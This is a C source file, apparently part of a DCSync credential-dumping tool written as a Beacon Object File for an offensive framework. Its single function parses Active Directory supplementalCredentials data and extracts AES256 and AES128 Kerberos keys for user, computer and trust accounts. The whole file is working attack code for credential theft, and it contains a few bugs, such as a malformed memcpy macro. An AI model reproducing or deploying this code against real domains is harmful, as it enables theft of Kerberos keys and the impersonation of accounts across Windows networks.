#include "dcsync.h"
#include <string.h>
#include <windows.h>

#define MSVCRT$memcpy memcpy;
// Parse Kerberos keys from supplementalCredentials
BOOL ParseKerberosKeys(const BYTE *propertyData, DWORD propertyLen,
                       const char *samAccountName, const char *dcHostname,
                       DWORD accountType, char *aes256Out, char *aes128Out) {
  if (!propertyData || !propertyLen || propertyLen < 32 || !samAccountName)
    return FALSE;

  // Skip 4-byte version prefix if present (00 00 00 01/02/03)
  const BYTE *structStart = propertyData;
  if (propertyData[0] == 0 && propertyData[1] == 0 && propertyData[2] == 0 &&
      propertyData[3] >= 1 && propertyData[3] <= 3) {
    structStart += 4;
  }

  // Read structure revision (big-endian USHORT at offset +0)
  USHORT revision = *(USHORT *)(structStart + 0);
  revision = ((revision & 0xFF) << 8) | ((revision >> 8) & 0xFF);
  BOOL isRevision0 = (revision == 0);

  // Read credential count (position varies by revision, big-endian)
  USHORT credCount = *(USHORT *)(structStart + (isRevision0 ? 2 : 4));
  credCount = ((credCount & 0xFF) << 8) | ((credCount >> 8) & 0xFF);
  if (credCount == 0 || credCount > 100)
    credCount = 3;

  // Read salt length (position varies by revision, big-endian)
  USHORT saltLen = *(USHORT *)(structStart + (isRevision0 ? 6 : 12));
  saltLen = ((saltLen & 0xFF) << 8) | ((saltLen >> 8) & 0xFF);
  if (saltLen == 0 || saltLen > 500)
    return FALSE;

  // Build search string to locate salt end based on account type
  // Trust accounts: uppercase domain FQDN + "krbtgt" + samAccountName (without
  // $) Computer account: uppercase FQDN + "host" + lowercase machine FQDN User
  // accounts: username as-is
  char searchName[256];
  DWORD searchLen = 0;
  DWORD nameLen = 0;
  while (samAccountName[nameLen] != '\0' && nameLen < 128)
    nameLen++;

  if (accountType == SAM_TRUST_ACCOUNT) {
    const char *domain = NULL;
    if (dcHostname) {
      for (DWORD i = 0; dcHostname[i] != '\0'; i++) {
        if (dcHostname[i] == '.') {
          domain = &dcHostname[i + 1];
          break;
        }
      }
    }
    if (domain && domain[0] != '\0') {
      // Add uppercase domain
      for (DWORD i = 0; domain[i] != '\0' && searchLen < 230; i++) {
        searchName[searchLen++] = domain[i];
      }
      // Append "krbtgt"
      if (searchLen + 6 < 255) {
        searchName[searchLen++] = 'k';
        searchName[searchLen++] = 'r';
        searchName[searchLen++] = 'b';
        searchName[searchLen++] = 't';
        searchName[searchLen++] = 'g';
        searchName[searchLen++] = 't';
      }
      // Append samAccountName (without trailing $)
      DWORD trustNameLen = nameLen;
      if (trustNameLen > 0 && samAccountName[trustNameLen - 1] == '$')
        trustNameLen--;
      for (DWORD i = 0; i < trustNameLen && searchLen < 255; i++) {
        searchName[searchLen++] = samAccountName[i];
      }
    }
  } else if (accountType == SAM_MACHINE_ACCOUNT) {
    const char *domain = NULL;
    if (dcHostname) {
      for (DWORD i = 0; dcHostname[i] != '\0'; i++) {
        if (dcHostname[i] == '.') {
          domain = &dcHostname[i + 1];
          break;
        }
      }
    }

    if (domain && domain[0] != '\0') {
      // Add uppercase domain FQDN
      for (DWORD i = 0; domain[i] != '\0' && searchLen < 200; i++) {
        searchName[searchLen++] = domain[i];
      }
    }

    // Append "host"
    if (searchLen + 4 < 255) {
      searchName[searchLen++] = 'h';
      searchName[searchLen++] = 'o';
      searchName[searchLen++] = 's';
      searchName[searchLen++] = 't';
    }

    // Add lowercase computer name (without trailing $)
    DWORD compNameLen = nameLen;
    if (nameLen > 0 && samAccountName[nameLen - 1] == '$')
      compNameLen--;

    for (DWORD i = 0; i < compNameLen && searchLen < 254; i++) {
      searchName[searchLen++] = samAccountName[i];
    }

    if (domain && domain[0] != '\0') {
      searchName[searchLen++] = '.';
      for (DWORD i = 0; domain[i] != '\0' && searchLen < 255; i++) {
        searchName[searchLen++] = domain[i];
      }
    }
  } else {
    // User account (SAM_USER_OBJECT): uppercase FQDN + samAccountName
    /*
    // This is optional, causes issues with Administrator account. disabled for
    now const char* domain = NULL; if (dcHostname) { for (DWORD i = 0;
    dcHostname[i] != '\0'; i++) { if (dcHostname[i] == '.') { domain =
    &dcHostname[i + 1]; break;
            }
        }
    }

    if (domain && domain[0] != '\0') {
        // Add uppercase domain FQDN
        for (DWORD i = 0; domain[i] != '\0' && searchLen < 200; i++) {
            char c = domain[i];
            if (c >= 'a' && c <= 'z') c -= ('a' - 'A');  // uppercase
            searchName[searchLen++] = c;
        }
    }
    */

    // Append samAccountName as-is
    for (DWORD i = 0; i < nameLen && searchLen < 255; i++) {
      searchName[searchLen++] = samAccountName[i];
    }
  }

  // Convert to UTF-16LE for searching
  BYTE searchUTF16[512];
  for (DWORD i = 0; i < searchLen; i++) {
    searchUTF16[i * 2] = searchName[i];
    searchUTF16[i * 2 + 1] = 0x00;
  }
  DWORD searchUTF16Len = searchLen * 2;

  // Find salt end by locating the search string (case-insensitive)
  DWORD descriptorStart = isRevision0 ? 32 : 28;
  DWORD matchOffset = 0xFFFFFFFF;
  for (DWORD i = descriptorStart + 20; i + searchUTF16Len <= propertyLen; i++) {
    BOOL match = TRUE;
    for (DWORD j = 0; j < searchUTF16Len; j++) {
      BYTE propertyByte = propertyData[i + j];
      BYTE searchByte = searchUTF16[j];

      // Case-insensitive comparison for ASCII letters in UTF-16LE (even
      // positions only)
      if (j % 2 == 0) {
        // Convert to uppercase for comparison
        if (propertyByte >= 'a' && propertyByte <= 'z')
          propertyByte -= ('a' - 'A');
        if (searchByte >= 'a' && searchByte <= 'z')
          searchByte -= ('a' - 'A');
      }

      if (propertyByte != searchByte) {
        match = FALSE;
        break;
      }
    }
    if (match) {
      matchOffset = i;
      break;
    }
  }

  if (matchOffset == 0xFFFFFFFF)
    return FALSE;

  // Calculate salt boundaries
  DWORD saltEnd = matchOffset + searchUTF16Len;

  // Need at least 48 bytes for AES256 (32) + AES128 (16)
  if (propertyLen - saltEnd < 48) {
    return FALSE;
  }

  // Keys are stored after salt as raw binary data
  DWORD scanStart = saltEnd;

  for (DWORD tryOffset = scanStart; tryOffset + 48 <= propertyLen;
       tryOffset++) {
    // Check if this looks like binary key data vs UTF-16LE text
    DWORD zeroCount = 0;
    DWORD evenZeros = 0;    // Zeros at even positions (0, 2, 4...)
    DWORD oddZeros = 0;     // Zeros at odd positions (1, 3, 5...)
    DWORD highBitCount = 0; // Bytes >= 0x80

    for (DWORD i = 0; i < 48; i++) {
      BYTE b = propertyData[tryOffset + i];
      if (b == 0x00) {
        zeroCount++;
        if (i % 2 == 0)
          evenZeros++;
        else
          oddZeros++;
      }
      if (b >= 0x80)
        highBitCount++;
    }

    // Skip if this looks like UTF-16LE text
    // User account keys may have more zeros than machine/trust keys
    if (oddZeros > 5)
      continue; // Too many odd zeros = UTF-16LE pattern
    if (zeroCount > 30)
      continue; // More than ~60% zeros = likely padding
    if (highBitCount < 5)
      continue; // Need some high-bit bytes for randomness

    // This looks like binary data - validate entropy
    char tempAES256[65] = {0};
    char tempAES128[33] = {0};
    BytesToHex(propertyData + tryOffset, 32, tempAES256);
    BytesToHex(propertyData + tryOffset + 32, 16, tempAES128);

    // Check for good entropy (not all same characters)
    DWORD sameCount256 = 0, sameCount128 = 0;
    for (int i = 1; i < 64; i++) {
      if (tempAES256[i] == tempAES256[i - 1])
        sameCount256++;
    }
    for (int i = 1; i < 32; i++) {
      if (tempAES128[i] == tempAES128[i - 1])
        sameCount128++;
    }
    if (sameCount256 > 50 || sameCount128 > 25)
      continue;

    // Found valid keys
    if (aes256Out)
      MSVCRT$memcpy(aes256Out, tempAES256, 65);
    if (aes128Out)
      MSVCRT$memcpy(aes128Out, tempAES128, 33);
    return TRUE;
  }

  return FALSE;
}
